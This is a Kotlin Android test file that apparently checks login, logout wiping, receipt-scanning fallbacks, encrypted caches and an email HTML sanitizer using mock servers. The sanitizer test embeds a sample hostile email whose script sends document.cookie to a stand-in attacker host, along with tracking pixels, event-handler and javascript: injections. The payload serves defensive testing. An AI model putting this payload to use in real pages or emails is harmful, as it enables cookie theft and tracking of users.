package de.meinseelenfunke.app.data

import android.app.Application
import android.appwidget.AppWidgetManager
import android.content.Context
import androidx.test.core.app.ApplicationProvider
import de.meinseelenfunke.app.data.repository.TwoFactorRequiredException
import de.meinseelenfunke.app.di.ServiceLocator
import de.meinseelenfunke.app.util.EmailHtmlSanitizer
import de.meinseelenfunke.app.util.ErrorSentinelReporter
import de.meinseelenfunke.app.widget.CalendarAppWidgetProvider
import de.meinseelenfunke.app.widget.MasterWidgetProvider
import de.meinseelenfunke.app.widget.MusicWidgetProvider
import de.meinseelenfunke.app.widget.ShoppingListWidgetProvider
import de.meinseelenfunke.app.widget.TasksWidgetProvider
import kotlinx.coroutines.test.runTest
import okhttp3.mockwebserver.MockResponse
import okhttp3.mockwebserver.MockWebServer
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.Shadows
import org.robolectric.annotation.Config
import java.io.File
import java.net.InetAddress

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [34], application = Application::class)
class RepositoriesMockWebServerTest {

    private lateinit var context: Context
    private lateinit var backendServer: MockWebServer
    private lateinit var geminiServer: MockWebServer

    @Before
    fun setUp() {
        context = ApplicationProvider.getApplicationContext()
        backendServer = MockWebServer()
        backendServer.start(InetAddress.getByName("127.0.0.1"), 0)

        geminiServer = MockWebServer()
        geminiServer.start(InetAddress.getByName("127.0.0.1"), 0)

        ServiceLocator.init(context)
        ErrorSentinelReporter.clearQueue(context)
        val mockBaseUrl = "http://127.0.0.1:${backendServer.port}/api/"
        assertTrue("MockWebServer loopback baseUrl must be accepted in debug test build", ServiceLocator.saveBaseUrl(mockBaseUrl))
    }

    @After
    fun tearDown() {
        try {
            ServiceLocator.financeRepository.geminiDirectEndpointOverride = null
        } catch (_: Exception) {
        }
        backendServer.shutdown()
        geminiServer.shutdown()
    }

    @Test
    fun authLoginStoresEncryptedTokenAndHandles2faChallenge() = runTest {
        backendServer.enqueue(
            MockResponse()
                .setResponseCode(200)
                .setHeader("Content-Type", "application/json")
                .setBody("""{"status":"two_factor_required","two_factor_required":true,"message":"Bitte 2FA-Code eingeben"}""")
        )
        val challengeRes = ServiceLocator.authRepository.login("kontakt@mein-seelenfunke.de", "Passwort123!")
        assertTrue(challengeRes.isFailure)
        assertTrue(challengeRes.exceptionOrNull() is TwoFactorRequiredException)
        assertNull(ServiceLocator.getAuthToken())

        backendServer.enqueue(
            MockResponse()
                .setResponseCode(200)
                .setHeader("Content-Type", "application/json")
                .setBody(
                    """{
                        "status":"success",
                        "token":"99|SanctumLiveTokenSecretAbcDef123456",
                        "user_type":"admin",
                        "user":{"id":"u1","first_name":"Alina","last_name":"Steinhauer","email":"kontakt@mein-seelenfunke.de","user_type":"admin"}
                    }"""
                )
        )
        val loginRes = ServiceLocator.authRepository.login("kontakt@mein-seelenfunke.de", "Passwort123!", "654321")
        assertTrue(loginRes.isSuccess)
        assertEquals("99|SanctumLiveTokenSecretAbcDef123456", ServiceLocator.getAuthToken())
        assertEquals("admin", ServiceLocator.getUserType())

        val rawStoredToken = context.getSharedPreferences("seelenfunke_prefs", Context.MODE_PRIVATE)
            .getString("auth_token", null)
        assertNotNull(rawStoredToken)
        assertTrue("Auth token on disk must be AES-256-GCM encrypted", rawStoredToken!!.startsWith("enc_v1:"))
        assertFalse(rawStoredToken.contains("SanctumLiveTokenSecretAbcDef123456"))
    }

    @Test
    fun authLogoutWipesAllPrefsQueuesBriefingsAndBroadcastsWidgetUpdates() {
        ServiceLocator.saveAuthToken("88|SessionTokenToRevokeOnLogout123456")
        backendServer.enqueue(MockResponse().setResponseCode(200).setBody("""{"status":"ok"}"""))

        val prefNames = listOf(
            "tasks_widget_prefs",
            "calendar_widget_prefs",
            "shopping_widget_prefs",
            "master_widget_prefs",
            "music_widget_prefs",
            "funkenwerk_alarm_prefs"
        )
        prefNames.forEach { name ->
            val p = context.getSharedPreferences(name, Context.MODE_PRIVATE)
            ServiceLocator.putEncryptedPref(p, "sensitive_key", """{"secret":"vertraulich"}""")
        }

        val briefingDir = File(context.filesDir, "funkira_briefings").apply { mkdirs() }
        val briefingFile = File(briefingDir, "alarm_0830.wav").apply { writeText("wavdata") }
        ErrorSentinelReporter.captureError(context, "TestTag", "Testfehler vor Logout")
        val sentinelQueueFile = File(context.filesDir, "error_sentinel_queue.json")
        assertTrue(sentinelQueueFile.exists())
        assertTrue(briefingFile.exists())

        Shadows.shadowOf(context as Application).clearBroadcastIntents()
        ServiceLocator.authRepository.logout()

        assertNull(ServiceLocator.getAuthToken())
        prefNames.forEach { name ->
            val map = context.getSharedPreferences(name, Context.MODE_PRIVATE).all
            assertTrue("Expected $name to be completely wiped on logout", map.isEmpty())
        }
        assertFalse("error_sentinel_queue.json must be deleted on logout", sentinelQueueFile.exists())
        assertFalse("funkira_briefings directory must be deleted on logout", briefingDir.exists())

        val broadcastComponents = Shadows.shadowOf(context as Application).broadcastIntents
            .filter { it.action == AppWidgetManager.ACTION_APPWIDGET_UPDATE }
            .mapNotNull { it.component?.className }
            .toSet()

        val expectedWidgets = setOf(
            TasksWidgetProvider::class.java.name,
            CalendarAppWidgetProvider::class.java.name,
            ShoppingListWidgetProvider::class.java.name,
            MasterWidgetProvider::class.java.name,
            MusicWidgetProvider::class.java.name
        )
        for (widgetClass in expectedWidgets) {
            assertTrue("Logout must broadcast ACTION_APPWIDGET_UPDATE to $widgetClass", broadcastComponents.contains(widgetClass))
        }
    }

    @Test
    fun financeScanReceiptNeverFallsBackToDirectGeminiOn401Or403Or422() = runTest {
        ServiceLocator.saveAuthToken("77|FinanceToken1234567890")
        ServiceLocator.saveGeminiApiKey("AIzaSyDummyGeminiKeyForUnitTesting12345")
        ServiceLocator.financeRepository.geminiDirectEndpointOverride =
            "http://127.0.0.1:${geminiServer.port}/v1beta/models/gemini-2.5-flash:generateContent"

        val activeScanStatusCode = java.util.concurrent.atomic.AtomicInteger(422)
        backendServer.dispatcher = object : okhttp3.mockwebserver.Dispatcher() {
            override fun dispatch(request: okhttp3.mockwebserver.RecordedRequest): MockResponse {
                val path = request.path ?: ""
                val code = activeScanStatusCode.get()
                return if (path.contains("/funki/financials/scan-receipt")) {
                    MockResponse()
                        .setResponseCode(code)
                        .setHeader("Connection", "close")
                        .setHeader("Content-Type", "application/json")
                        .setBody("""{"success":false,"message":"Backend lehnte Beleg ab ($code)"}""")
                } else {
                    MockResponse()
                        .setResponseCode(200)
                        .setHeader("Connection", "close")
                        .setHeader("Content-Type", "application/json")
                        .setBody("""{"success":true}""")
                }
            }
        }

        for (statusCode in listOf(422, 403, 401)) {
            activeScanStatusCode.set(statusCode)
            ServiceLocator.saveAuthToken("77|FinanceToken1234567890")

            val result = ServiceLocator.financeRepository.scanReceipt(
                fileBytes = ByteArray(32) { 1 },
                fileName = "beleg.jpg",
                mimeType = "image/jpeg",
                autoSave = false
            )

            assertTrue("HTTP $statusCode must return failure", result.isFailure)
            assertFalse(
                "HTTP $statusCode must NEVER trigger client-side Gemini fallback",
                ServiceLocator.financeRepository.lastDirectGeminiFallbackInvoked
            )
            assertEquals(
                "Zero requests may be sent to Gemini on HTTP $statusCode",
                0,
                geminiServer.requestCount
            )
        }
    }

    @Test
    fun organizerRepositoryCrudEncryptsCacheAndDeletesTask() = runTest {
        ServiceLocator.saveAuthToken("55|OrganizerToken1234567890")

        // 1. Add task to explicit list
        backendServer.enqueue(
            MockResponse()
                .setResponseCode(200)
                .setHeader("Content-Type", "application/json")
                .setBody(
                    """{
                        "success":true,
                        "data":{
                            "id":"task_42",
                            "task_list_id":"list_1",
                            "parent_id":null,
                            "title":"Westpack Schmuckboxen nachbestellen",
                            "priority":"hoch",
                            "is_completed":false,
                            "parent_title":null,
                            "relevant_from":"2026-11-14"
                        }
                    }"""
                )
        )
        val addRes = ServiceLocator.organizerRepository.addTask("list_1", "Westpack Schmuckboxen nachbestellen", "hoch", "2026-11-14")
        assertTrue(addRes.isSuccess)
        assertEquals("task_42", addRes.getOrNull()?.id)

        val postReq = backendServer.takeRequest()
        assertEquals("POST", postReq.method)
        assertEquals("/api/funki/tasks/lists/list_1/tasks", postReq.path)
        assertEquals("Bearer 55|OrganizerToken1234567890", postReq.getHeader("Authorization"))

        // Verify tasks_cache in SharedPreferences is encrypted with enc_v1:
        val rawCached = context.getSharedPreferences("tasks_widget_prefs", Context.MODE_PRIVATE)
            .getString("tasks_cache", null)
        assertNotNull(rawCached)
        assertTrue(rawCached!!.startsWith("enc_v1:"))
        assertFalse(rawCached.contains("Westpack Schmuckboxen"))

        // 2. Delete task -> DELETE /api/funki/tasks/task_42
        backendServer.enqueue(
            MockResponse()
                .setResponseCode(200)
                .setHeader("Content-Type", "application/json")
                .setBody("""{"success":true,"message":"Gelöscht"}""")
        )
        val delRes = ServiceLocator.organizerRepository.deleteTask("task_42")
        assertTrue(delRes.isSuccess)

        val delReq = backendServer.takeRequest()
        assertEquals("DELETE", delReq.method)
        assertEquals("/api/funki/tasks/task_42", delReq.path)
    }

    @Test
    fun organizerRepositoryPropagatesHttp500FailureWhenUncached() = runTest {
        ServiceLocator.saveAuthToken("55|OrganizerToken1234567890")
        context.getSharedPreferences("tasks_widget_prefs", Context.MODE_PRIVATE).edit().clear().commit()

        backendServer.enqueue(
            MockResponse()
                .setResponseCode(500)
                .setHeader("Content-Type", "application/json")
                .setBody("""{"message":"Internal Server Error"}""")
        )

        val tasksResult = ServiceLocator.organizerRepository.getTasks()
        assertTrue(
            "Uncached HTTP 500 must propagate Result.failure instead of masquerading as empty success",
            tasksResult.isFailure
        )
    }

    @Test
    fun emailHtmlSanitizerStripsScriptsBaseHandlersAndBlocksTrackingPixelsByDefault() {
        val maliciousEmailHtml = """
            <html>
            <head>
                <base href="https://evil.attacker.tld/">
                <link rel="stylesheet" href="https://tracker.attacker.tld/open.css">
                <script>fetch('https://evil.attacker.tld/steal?c=' + document.cookie)</script>
            </head>
            <body onload="alert(1)">
                <p onclick="evil()">Hallo Alina,</p>
                <a href="javascript:alert(2)">Rechnung ansehen</a>
                <img src="https://tracker.attacker.tld/pixel.gif" onerror="steal()">
                <iframe src="https://evil.attacker.tld/frame"></iframe>
            </body>
            </html>
        """.trimIndent()

        val wrappedDefault = EmailHtmlSanitizer.wrapSafeHtmlDocument(maliciousEmailHtml, allowExternalImages = false)
        assertFalse(wrappedDefault.contains("<script", ignoreCase = true))
        assertFalse(wrappedDefault.contains("<iframe", ignoreCase = true))
        assertFalse(wrappedDefault.contains("<base", ignoreCase = true))
        assertFalse(wrappedDefault.contains("<link", ignoreCase = true))
        assertFalse(wrappedDefault.contains("onload", ignoreCase = true))
        assertFalse(wrappedDefault.contains("onclick", ignoreCase = true))
        assertFalse(wrappedDefault.contains("onerror", ignoreCase = true))
        assertFalse(wrappedDefault.contains("javascript:", ignoreCase = true))
        assertTrue("Default CSP must block remote images via img-src data:;", wrappedDefault.contains("img-src data:;"))

        assertFalse(EmailHtmlSanitizer.isAllowedWebResourceScheme("https", allowExternalImages = false))
        assertFalse(EmailHtmlSanitizer.isAllowedWebResourceScheme("http", allowExternalImages = true))
        assertFalse(EmailHtmlSanitizer.isAllowedWebResourceScheme("file", allowExternalImages = true))
        assertTrue(EmailHtmlSanitizer.isAllowedWebResourceScheme("data", allowExternalImages = false))
        assertTrue(EmailHtmlSanitizer.isAllowedWebResourceScheme("https", allowExternalImages = true))

        val wrappedWithImages = EmailHtmlSanitizer.wrapSafeHtmlDocument(maliciousEmailHtml, allowExternalImages = true)
        assertTrue(wrappedWithImages.contains("img-src https: data:;"))
    }

    @Test
    fun financeScanReceipt502FetchesEphemeralVertexTokenEncryptsCacheAndCallsVertexWithBearerAndUserRole() = runTest {
        de.meinseelenfunke.app.util.VertexClientTokenCache.clear()
        ServiceLocator.saveAuthToken("77|AdminSanctumTokenForVertex123456")
        ServiceLocator.financeRepository.geminiDirectEndpointOverride =
            "http://127.0.0.1:${geminiServer.port}/v1beta1/projects/gen-lang-client-0670786367/locations/global/publishers/google/models/gemini-3.5-flash:generateContent"

        val capturedBackendRequests = java.util.concurrent.CopyOnWriteArrayList<okhttp3.mockwebserver.RecordedRequest>()
        backendServer.dispatcher = object : okhttp3.mockwebserver.Dispatcher() {
            override fun dispatch(request: okhttp3.mockwebserver.RecordedRequest): MockResponse {
                val path = request.path ?: ""
                if (path.contains("/system/error-ingest")) {
                    return MockResponse()
                        .setResponseCode(200)
                        .setHeader("Connection", "close")
                        .setHeader("Content-Type", "application/json")
                        .setBody("""{"status":"ok"}""")
                }
                capturedBackendRequests.add(request)
                return when {
                    path.contains("/funki/financials/scan-receipt") -> MockResponse()
                        .setResponseCode(502)
                        .setHeader("Connection", "close")
                        .setBody("""{"success":false,"message":"Bad Gateway"}""")
                    path.contains("/ai/vertex-ephemeral") -> MockResponse()
                        .setResponseCode(200)
                        .setHeader("Connection", "close")
                        .setHeader("Content-Type", "application/json")
                        .setBody(
                            """{
                                "status":"ok",
                                "access_token":"ya29.MockAndroidVertexPostpayToken99887766",
                                "expires_in_seconds":3000,
                                "project_id":"gen-lang-client-0670786367",
                                "rest_models_base_url":"https://aiplatform.googleapis.com/v1beta1/projects/gen-lang-client-0670786367/locations/global/publishers/google/models",
                                "live_ws_url":"wss://europe-west4-aiplatform.googleapis.com/ws/google.cloud.aiplatform.v1beta1.LlmBidiService/BidiGenerateContent",
                                "live_model":"projects/gen-lang-client-0670786367/locations/europe-west4/publishers/google/models/gemini-live-2.5-flash-native-audio"
                            }"""
                        )
                    else -> MockResponse().setResponseCode(404)
                }
            }
        }
        geminiServer.enqueue(
            MockResponse()
                .setResponseCode(200)
                .setHeader("Content-Type", "application/json")
                .setBody(
                    """{
                        "candidates":[{
                            "content":{
                                "role":"model",
                                "parts":[{"text":"{\"merchant\":\"Westpack\",\"description\":\"Schmuckboxen\",\"title\":\"Westpack - Schmuckboxen\",\"amount\":89.50,\"date\":\"2026-11-17\",\"location\":\"Gifhorn\",\"category\":\"Verpackung\",\"is_business\":true,\"tax_rate\":19.0,\"invoice_number\":\"WP-2026-11\"}"}]
                            }
                        }]
                    }"""
                )
        )

        val res = ServiceLocator.financeRepository.scanReceipt(
            fileBytes = ByteArray(24) { 7 },
            fileName = "westpack.jpg",
            mimeType = "image/jpeg",
            autoSave = false
        )
        assertTrue("Expected Vertex direct receipt fallback to succeed", res.isSuccess)
        assertEquals("Westpack - Schmuckboxen", res.getOrNull()?.data?.title)

        assertEquals(2, capturedBackendRequests.size)
        val scanReq = capturedBackendRequests[0]
        assertTrue(scanReq.path!!.contains("/funki/financials/scan-receipt"))
        val ephemeralReq = capturedBackendRequests[1]
        assertEquals("/api/ai/vertex-ephemeral", ephemeralReq.path)
        assertEquals("Bearer 77|AdminSanctumTokenForVertex123456", ephemeralReq.getHeader("Authorization"))

        val vertexReq = geminiServer.takeRequest()
        assertEquals("Bearer ya29.MockAndroidVertexPostpayToken99887766", vertexReq.getHeader("Authorization"))
        assertNull("Vertex AI call must never send legacy x-goog-api-key", vertexReq.getHeader("x-goog-api-key"))
        val sentJson = org.json.JSONObject(vertexReq.body.readUtf8())
        assertEquals("user", sentJson.getJSONArray("contents").getJSONObject(0).getString("role"))

        // Verify AES-256-GCM encryption of cached Vertex token on disk + wipe on clearAuthToken()
        val rawStored = context.getSharedPreferences("seelenfunke_prefs", Context.MODE_PRIVATE)
            .getString(de.meinseelenfunke.app.util.VertexClientTokenCache.PREF_KEY_VERTEX_BUNDLE, null)
        assertNotNull(rawStored)
        assertTrue(rawStored!!.startsWith("enc_v1:"))
        assertFalse(rawStored.contains("ya29.MockAndroidVertexPostpayToken99887766"))

        ServiceLocator.clearAuthToken()
        assertNull(de.meinseelenfunke.app.util.VertexClientTokenCache.getValidCachedBundle(context))
    }
}
